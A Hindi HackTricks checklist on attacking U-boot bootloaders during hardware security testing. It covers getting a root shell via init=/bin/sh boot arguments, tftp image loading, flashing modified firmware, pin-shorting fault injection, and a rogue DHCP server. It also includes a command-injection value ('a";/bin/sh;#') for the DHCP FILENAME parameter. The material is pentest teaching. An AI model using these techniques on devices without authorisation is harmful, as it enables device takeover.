<details>

<summary><strong>AWS हैकिंग सीखें शून्य से लेकर हीरो तक</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> के साथ!</strong></summary>

HackTricks का समर्थन करने के अन्य तरीके:

* यदि आप चाहते हैं कि आपकी **कंपनी का विज्ञापन HackTricks में दिखाई दे** या **HackTricks को PDF में डाउनलोड करें** तो [**सब्सक्रिप्शन प्लान्स**](https://github.com/sponsors/carlospolop) देखें!
* [**आधिकारिक PEASS & HackTricks स्वैग**](https://peass.creator-spring.com) प्राप्त करें
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) की खोज करें, हमारा विशेष [**NFTs**](https://opensea.io/collection/the-peass-family) संग्रह
* 💬 [**Discord समूह**](https://discord.gg/hRep4RUj7f) में **शामिल हों** या [**telegram समूह**](https://t.me/peass) में या **Twitter** 🐦 पर मुझे **फॉलो** करें [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **अपनी हैकिंग ट्रिक्स साझा करें, HackTricks** [**HackTricks**](https://github.com/carlospolop/hacktricks) और [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos में PRs सबमिट करके.

</details>


[https://scriptingxss.gitbook.io/firmware-security-testing-methodology/](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/) से कॉपी किया गया

जब डिवाइस स्टार्ट अप और बूटलोडर्स जैसे U-boot में संशोधन कर रहे हों, तो निम्नलिखित का प्रयास करें:

* बूट के दौरान "0", स्पेस या अन्य पहचाने गए “मैजिक कोड्स” दबाकर बूटलोडर्स इंटरप्रेटर शेल तक पहुँचने का प्रयास करें।
* शेल कमांड जैसे '`init=/bin/sh`' को बूट आर्ग्यूमेंट्स के अंत में जोड़कर कॉन्फ़िगरेशन में संशोधन करें
* `#printenv`
* `#setenv bootargs=console=ttyS0,115200 mem=63M root=/dev/mtdblock3 mtdparts=sflash:<partitiionInfo> rootfstype=<fstype> hasEeprom=0 5srst=0 init=/bin/sh`
* `#saveenv`
* `#boot`
* अपने वर्कस्टेशन से नेटवर्क पर स्थानीय रूप से इमेजेज लोड करने के लिए एक tftp सर्वर सेटअप करें। सुनिश्चित करें कि डिवाइस को नेटवर्क एक्सेस प्राप्त है।
* `#setenv ipaddr 192.168.2.2 #डिवाइस का स्थानीय IP`
* `#setenv serverip 192.168.2.1 #tftp सर्वर IP`
* `#saveenv`
* `#reset`
* `#ping 192.168.2.1 #जांचें कि नेटवर्क एक्सेस उपलब्ध है या नहीं`
* `#tftp ${loadaddr} uImage-3.6.35 #loadaddr दो आर्ग्यूमेंट्स लेता है: फाइल को लोड करने के लिए एड्रेस और TFTP सर्वर पर इमेज का फाइलनेम`
* रूट प्राप्त करने के लिए uboot-image लिखने और संशोधित फर्मवेयर पुश करने के लिए `ubootwrite.py` का उपयोग करें
* सक्षम डिबग फीचर्स की जांच करें जैसे:
* विस्तृत लॉगिंग
* मनमाने कर्नेल्स लोड करना
* अविश्वसनीय स्रोतों से बूट करना
* \*सावधानी बरतें: एक पिन को ग्राउंड से जोड़ें, डिवाइस बूट अप सीक्वेंस को देखें, कर्नेल डिकंप्रेस होने से पहले, ग्राउंडेड पिन को SPI फ्लैश चिप पर एक डेटा पिन (DO) से शॉर्ट/कनेक्ट करें
* \*सावधानी बरतें: एक पिन को ग्राउंड से जोड़ें, डिवाइस बूट अप सीक्वेंस को देखें, कर्नेल डिकंप्रेस होने से पहले, ग्राउंडेड पिन को NAND फ्लैश चिप के पिन 8 और 9 से उस समय शॉर्ट/कनेक्ट करें जब U-boot UBI इमेज को डिकंप्रेस करता है
* पिन्स को शॉर्ट करने से पहले NAND फ्लैश चिप की डेटाशीट की समीक्षा करें
* PXE बूट के दौरान डिवाइस द्वारा इन्जेस्ट करने के लिए दुर्भावनापूर्ण पैरामीटर्स के साथ एक रोग डीएचसीपी सर्वर कॉन्फ़िगर करें
* Metasploit के (MSF) DHCP औक्सिलियरी सर्वर का उपयोग करें और डिवाइस स्टार्टअप प्रक्रियाओं के लिए इनपुट वैलिडेशन की जांच के लिए '`FILENAME`' पैरामीटर में कमांड इंजेक्शन कमांड्स जैसे `‘a";/bin/sh;#’` को संशोधित करें।

\*हार्डवेयर सुरक्षा परीक्षण


<details>

<summary><strong>AWS हैकिंग सीखें शून्य से लेकर हीरो तक</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> के साथ!</strong></summary>

HackTricks का समर्थन करने के अन्य तरीके:

* यदि आप चाहते हैं कि आपकी **कंपनी का विज्ञापन HackTricks में दिखाई दे** या **HackTricks को PDF में डाउनलोड करें** तो [**सब्सक्रिप्शन प्लान्स**](https://github.com/sponsors/carlospolop) देखें!
* [**आधिकारिक PEASS & HackTricks स्वैग**](https://peass.creator-spring.com) प्राप्त करें
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) की खोज करें, हमारा विशेष [**NFTs**](https://opensea.io/collection/the-peass-family) संग्रह
* 💬 [**Discord समूह**](https://discord.gg/hRep4RUj7f) में **शामिल हों** या [**telegram समूह**](https://t.me/peass) में या **Twitter** 🐦 पर मुझे **फॉलो** करें [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **अपनी हैकिंग ट्रिक्स साझा करें, HackTricks** [**HackTricks**](https://github.com/carlospolop/hacktricks) और [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos में PRs सबमिट करके.

</details>
